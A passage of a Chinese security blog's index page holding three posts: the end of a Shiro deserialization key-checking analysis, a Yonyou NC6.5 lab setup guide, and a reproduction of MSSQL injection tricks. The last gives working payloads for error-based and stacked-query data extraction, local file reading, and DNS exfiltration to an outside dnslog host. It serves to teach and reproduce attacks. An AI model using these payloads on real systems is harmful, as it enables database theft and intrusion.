lines:</span><br><span class="line">            domain&#x3D;i.strip(&#39;\n&#39;)</span><br><span class="line">            shiroScan(domain)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180705142.png" alt="image-20201201180705142"></p>
<h4 id="如何判断key是否正确？"><a href="#如何判断key是否正确？" class="headerlink" title="如何判断key是否正确？"></a><strong>如何判断key是否正确？</strong></h4><p>​    通过上面的测试我们知道当我们使用的加密key正确可以正常进行反序列化操作，即使key正确，但生成的内容无法正常反序列化，则还是会返回rememberMe=deleteMe，因为反序列化的操作是在convertBytesToPrincipals方法完成的，如果反序列化的过程中出现异常，还是会设置rememberMe=deleteMe这个请求头，因此我们测试key是否正确，需要找到一个可以不依赖第三方组件的java中默认存在且和jdk版本无关的类来进行反序列化。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094802148.png" alt="image-20201202094802148"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094838261.png" alt="image-20201202094838261"></p>
<p>​        我尝试使用URLDNS来进行判断，虽然可以正常发起DNS请求，但 由于执行过程中的类型转换错误，因此还是会返回rememberMe=deleteMe。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202100922001.png" alt="image-20201202100922001"></p>
<p>​        我们正常的登录，看看正常登录过程中的反序列化的类是什么类型</p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104733807.png" alt="image-20201202104733807"></strong></p>
<p>​        使用这个rememberMe的内容利用，看shiro再进行反序列化的过程中反序列化的是哪个类？</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104854538.png" alt="image-20201202104854538"></p>
<p>​        跟进后发现是反序列化了SimplePrincipalCollection类，所以我们只要创建一个SimplePrincipalCollection对应的对象进行序列化就可以了，当传入的序列化内容可以正常被解析，就不会出现rememberMe=deleteMe，因此可以通过这个特性来判断我们的key是否正确。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105111202.png" alt="image-20201202105111202"></p>
<p>​        我们查看一下ShiroExploit这个工具，看看他是怎么实现的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105408945.png" alt="image-20201202105408945"></p>
<p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
<h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">用友NC6.5漏洞复现及分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-15 13:53:27" itemprop="dateCreated datePublished" datetime="2020-11-15T13:53:27+08:00">2020-11-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-17 11:57:42" itemprop="dateModified" datetime="2020-11-17T11:57:42+08:00">2020-11-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    最近在项目里遇到了用友的NC，借着项目的机会对用友NC6.5的漏洞进行复现和分析。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    再安装之前，首先要配置用友的数据库，可以选择oracle或者sqlserver，我这里选择sqlserver搭建数据库，首先创建一个数据库命名为NC65，再创建文件组，文件组如下，分别添加nnc_data01，nnc_data02，nnc_data03，nnc_index01，nnc_index02，nnc_index03</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117111843846.png" alt="image-20201117111843846"></p>
<p>​    再选择文件，大小设置为500M，增量选择1024K</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117111854957.png" alt="image-20201117111854957"></p>
<p>​    在数据库服务器中选择 管理工具 –数据源–创建数据源</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110200334.png" alt="image-20201117110200334"></p>
<p>​    更改默认数据库</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110344395.png" alt="image-20201117110344395"></p>
<p>​    在文件的压缩包下包含了一个自带的jdk文件，将这个文件夹放到C盘下并添加到环境变量中，如果已经安装了JDK可以跳过这个步骤。</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115142147770.png" alt="image-20201115142147770"></p>
<p>​    首先再网上下载到用友NC6.5的安装包，下载好以后，点击setup.bat进行安装</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110456049.png" alt="image-20201117110456049"></p>
<p>​    然后要选择安装的产品，一般必须包含UAP Server、智能客户端应用平台这两个模块</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117112016776.png" alt="image-20201117112016776"></p>
<p>​    <img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110628012.png" alt="image-20201117110628012"></p>
<p>安装完成的界面如下</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115135748274.png" alt="image-20201115135748274"></p>
<p>​    点击“下一步”，会来到下面的界面</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115135955551.png" alt="image-20201115135955551"></p>
<p>​    点击读取，再设置服务的ip地址</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115140100655.png" alt="image-20201115140100655"></p>
<p>​    下面我们选择数据源，我这里的SQLSERVER数据源不是本机，所以写的其他地址，刚进入这个选项的时候是编辑不了的，我们首先要选择“读取”，再选择“添加，填上数据库地址，端口，数据库名称，用户名密码，失效检查周期，缓存数等信息后选择保存。</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115140841293.png" alt="image-20201115140841293"></p>
<p>​    选择测试连接</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094057883.png" alt="image-20201117094057883"></p>
<p>​    再配置文件服务器，服务器的ip地址就选择我们当前开启用友服务的ip地址。</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094219006.png" alt="image-20201117094219006"></p>
<p>​    再选择配置安全数据源</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094308413.png" alt="image-20201117094308413"></p>
<p>​    </p>
<p>  选择部署服务器</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115143853009.png" alt="image-20201115143853009"></p>
<p>​    配置好以后选择退出，在c盘的home目录下找到startserver.bat文件运行，如下所示：</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115144353245.png" alt="image-20201115144353245"></p>
<p>​    这里有一个小坑，如果jdk路径中有空格则会失败</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117114607825.png" alt="image-20201117114607825"></p>
<p>​    启动后查看是否访问成功</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115144511131.png" alt="image-20201115144511131"></p>
<p>​    这里提供了两种方式访问用友，一种是通过下载客户端访问，一种是浏览器访问，浏览器访问需要下载和安装jdk7比较麻烦，我们可以下载uclient访问。下载好以后选择添加应用，输入我们服务端的ip地址，将NC6.5添加到应用列表中。</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117095853871.png" alt="image-20201117095853871"></p>
<p>​    这里我的数据库一直都没装上去。系统选项为空，导致没有办法正常登录。</p>
<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117115609270.png" alt="image-20201117115609270"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于sqlserver注入另类技巧的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-13 16:50:19" itemprop="dateCreated datePublished" datetime="2020-11-13T16:50:19+08:00">2020-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-19 15:20:27" itemprop="dateModified" datetime="2020-11-19T15:20:27+08:00">2020-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    最近看到国外一篇关于<a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" target="_blank" rel="noopener">mssql注入利用</a>的文章，里面用了很多技巧我之前一直不知道，所以自己对这些技巧进行了复现,本次测试的环境为SQLSERVER2008</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    之前对于SQLSERVER报错注入理解仅限于类型转换导致的报错的利用方法，这次看到有很多新的函数可以进行报错注入利用，我把每个函数的测试单独取出来进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUSER_NAME()</span><br><span class="line">USER_NAME()</span><br><span class="line">PERMISSIONS()</span><br><span class="line">DB_NAME()</span><br><span class="line">FILE_NAME()</span><br><span class="line">TYPE_NAME()</span><br><span class="line">COL_NAME()</span><br></pre></td></tr></table></figure>

<p>​        SUSER_NAME()函数本来的作用是通过用户的id返回用户名,那id是int型的，由于我们输入的语句返回结果是varchar类型，因此会导致类型转换异常和报错，如下所示：</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113165830418.png" alt="image-20201113165830418"></p>
<p>​    我们已经可以看到报错了，但是如果想要获取更多的信息怎么办，还能通过这个函数来进行报错注入的利用吗？可以的，语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select @@version))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170131763.png" alt="image-20201113170131763"></p>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170346115.png" alt="image-20201113170346115"></p>
<p>上面是直接执行的结果，如果我们放到具体的注入语句里该怎么用？使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_Attitudes where id &#x3D;1 and 1&#x3D;SUSER_NAME(@@version)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172402013.png" alt="image-20201113172402013"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172434689.png" alt="image-20201113172434689"></p>
<p>​    其他函数的用法类似，所以不一一说明了，下面给出利用的截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;USER_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;PERMISSIONS((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;DB_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;FILE_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;TYPE_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172656283.png" alt="image-20201113172656283"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172708675.png" alt="image-20201113172708675"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172721793.png" alt="image-20201113172721793"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172733723.png" alt="image-20201113172733723"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172755049.png" alt="image-20201113172755049"></p>
<pre><code>最后一个函数COL_NAME有一点不一样，需要两个参数</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;COL_NAME((select top 1 table_name from information_schema.tables),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172912410.png" alt="image-20201113172912410"></p>
<p>​    这些函数都有一个特性，就是他们输入的值都为int，返回值为varchar，我们可以利用这个特征去找其他可能导致报错注入的函数，之所以要了解这些函数，我们可以在利用报错注入某些函数被拦截的时候，通过替换为其他函数的方式来利用报错注入。</p>
<h2 id="快速获取数据的小技巧"><a href="#快速获取数据的小技巧" class="headerlink" title="快速获取数据的小技巧"></a>快速获取数据的小技巧</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​    我个人觉得MSSQL的报错注入比较鸡肋，因为MSSQL注入点一般都会支持堆叠查询，通过报错注入获取数据的速度远不如堆叠注入获取数据的速度快，这里我给出堆叠注入快速获取数据的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM master..sysdatabases SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有数据库</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX)  SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..sysobjects WHERE type &#x3D; &#39;U&#39; SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有的表</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..syscolumns WHERE id&#x3D;object_id(&#39;表名&#39;) SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) select cast(@myoutput as int) </span><br><span class="line">列出所有的列</span><br></pre></td></tr></table></figure>

<p>获取所有数据库</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173622807.png" alt="image-20201113173622807"></p>
<p>获取所有表名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173643045.png" alt="image-20201113173643045"></p>
<p>获取所有列名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173732520.png" alt="image-20201113173732520"></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>​    在MSSQL 2016及以后支持使用FOR JSON AUTO函数，我们可以使用这个函数结合联合查询获取数据,由于我本地的数据库版本比较低，所以复现不了这种利用方式，这里给出作者的Payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113200720930.png" alt="image-20201113200720930"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>​    还是由于环境的问题，无法复现这种利用方式，给出作者的payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113201003499.png" alt="image-20201113201003499"></p>
<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119114708244.png" alt="image-20201119114708244"></p>
<p>​    我尝试在报错注入中用到这种方法，但是并没有成功利用，但是可以在union联合查询中利用该方法读取文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AtUsers where id&#x3D;-1 union select  null,(SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document),null,null</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115448908.png" alt="image-20201119115448908"></p>
<h2 id="获取当前正在执行的语句"><a href="#获取当前正在执行的语句" class="headerlink" title="获取当前正在执行的语句"></a>获取当前正在执行的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115716185.png" alt="image-20201119115716185"></p>
<p>​    这种语句在报错注入中仍然是有效的</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115821821.png" alt="image-20201119115821821"></p>
<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>​    通过fn_xe_file_target_read_file加载UNC路径请求DNS,虽然这个函数第一个和第二个参数都是文件路径，但实际上会先去请求第一个参数对应的路径，所以一般情况下最好用第一个参数加载执行，当我们多次请求同一个UNC路径，只会执行第一次，所以每次执行完后，最好将前面的路径稍微改一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;\\1a.idbfh8.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133707689.png" alt="image-20201119133707689"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133712427.png" alt="image-20201119133712427"></p>
<p>​    在什么情况下可以用fn_xe_file_target_read_file的第二个参数进行利用呢，答案是当第一个参数指定的路径存在的情况下。</p>
